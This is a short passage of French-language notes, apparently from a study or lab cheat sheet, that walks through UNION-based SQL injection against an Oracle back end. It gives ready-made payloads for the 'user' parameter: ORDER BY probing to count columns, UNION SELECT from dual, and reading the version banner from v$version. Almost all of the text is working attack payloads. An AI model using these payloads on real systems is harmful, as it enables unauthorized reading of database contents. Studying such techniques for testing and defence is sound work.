...
1. connaitre d'abord le nombre de colonne retourner dans la réponse à la requête: `?user=bro' order by x --` (incrément x jusqu'à avoir une erreur)
2. recupérer ensuite les données : `?user=bro' union select 'a','b' from dual--` (pour une BD oracle; nous avons 'a' et 'b' car nous supposons qu'il y a que 2 colonnes) 
3. e.g recupérer la version de BD oracle : `?user=bro' union select 'a',banner from v$version--`
4. si pas connaissance du type de la colonne alors mettre null.
